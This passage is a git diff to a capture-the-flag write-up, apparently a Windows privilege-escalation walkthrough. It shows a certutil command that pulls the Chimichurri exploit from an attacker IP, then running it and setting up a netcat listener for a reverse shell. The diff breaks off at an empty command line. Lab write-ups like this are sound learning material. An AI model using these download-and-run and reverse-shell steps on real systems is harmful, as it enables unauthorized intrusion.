@@ -231,8 +231,17 @@ Sending the file over to the target
 
 command:```certutil -urlcache -f http://10.10.14.142/Chimichurri.exe c.exe```
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/15d935c2-bcaf-43a3-bae3-d866f8b590d4)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/68b51e97-6a2f-4532-a5f4-ada3f952dab7)
 
+Running the executable ```.\c.exe``` you get this
+
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/ef04d072-925f-428d-8ebe-3f04f94830d3)
+
+So we ought to specify our ip and the port  we plan on listening on. I'll up a netcat listener on ```port 1337```
+
+Running the executable again
+
+command:```
 
 
 
